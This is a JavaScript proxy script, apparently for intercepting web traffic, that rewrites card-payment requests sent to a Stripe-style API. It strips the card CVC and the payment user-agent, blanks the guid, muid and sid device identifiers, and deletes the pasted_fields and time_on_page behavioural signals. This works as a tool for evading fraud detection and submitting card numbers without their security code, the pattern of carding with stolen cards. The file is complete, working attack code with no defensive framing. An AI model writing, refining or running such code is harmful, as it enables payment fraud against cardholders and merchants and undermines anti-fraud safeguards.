// Function to parse URL-encoded form data
function parseXWwwFormUrlencoded(data) {
  let result = {};
  data.split('&').forEach(item => {
    let [key, value] = item.split('=');
    result[key] = decodeURIComponent(value.replace(/\+/g, ' '));
  });
  return result;
}

// Function to build URL-encoded form data
function buildXWwwFormUrlencoded(data) {
  return Object.keys(data)
    .map(key => `${key}=${encodeURIComponent(data[key]).replace(/%20/g, '+')}`)
    .join('&');
}

// Function to delete keys from an object
function deleteFromArray(parsedBody, key) {
  delete parsedBody[key];
  return parsedBody;
}

// Function to handle request modification
async function onRequest(context, request) {
  console.log(request.url);
  let parsedBody = {};

  if (request.body) {
    const reqBody = request.body;
    
    if (reqBody.includes("payment_method_data[card][number]")) {
      parsedBody = parseXWwwFormUrlencoded(reqBody);

      // Delete CVV and other fields under payment_method_data[card]
      parsedBody = deleteFromArray(parsedBody, "payment_method_data[card][cvc]");
      parsedBody = deleteFromArray(parsedBody, "payment_method_data[payment_user_agent]");
      if ("guid" in parsedBody) parsedBody["guid"] = "NA";
      if ("muid" in parsedBody) parsedBody["muid"] = "NA";
      if ("sid" in parsedBody) parsedBody["sid"] = "NA";

      // Delete logging fields
      parsedBody = deleteFromArray(parsedBody, "payment_method_data[pasted_fields]");
      parsedBody = deleteFromArray(parsedBody, "payment_method_data[time_on_page]");

    } else if (reqBody.includes("source_data[card][number]")) {
      parsedBody = parseXWwwFormUrlencoded(reqBody);

      // Delete CVV and other fields under source_data[card]
      parsedBody = deleteFromArray(parsedBody, "source_data[card][cvc]");
      parsedBody = deleteFromArray(parsedBody, "source_data[payment_user_agent]");
      if ("guid" in parsedBody) parsedBody["guid"] = "NA";
      if ("muid" in parsedBody) parsedBody["muid"] = "NA";
      if ("sid" in parsedBody) parsedBody["sid"] = "NA";

      // Delete logging fields
      parsedBody = deleteFromArray(parsedBody, "source_data[pasted_fields]");
      parsedBody = deleteFromArray(parsedBody, "source_data[time_on_page]");

    } else if (reqBody.includes("card[number]")) {
      parsedBody = parseXWwwFormUrlencoded(reqBody);

      // Delete CVV and other fields under card
      parsedBody = deleteFromArray(parsedBody, "card[cvc]");
      parsedBody = deleteFromArray(parsedBody, "payment_user_agent");
      if ("guid" in parsedBody) parsedBody["guid"] = "NA";
      if ("muid" in parsedBody) parsedBody["muid"] = "NA";
      if ("sid" in parsedBody) parsedBody["sid"] = "NA";

      // Delete logging fields
      parsedBody = deleteFromArray(parsedBody, "pasted_fields");
      parsedBody = deleteFromArray(parsedBody, "time_on_page");
    }

    if (Object.keys(parsedBody).length > 0) {
      request.body = buildXWwwFormUrlencoded(parsedBody);
      console.log("New Body:\n", request.body);
    }
  }
  return request;
}

// Function to handle response modification
async function onResponse(context, request, response) {
  // Modify response if needed
  return response;
}
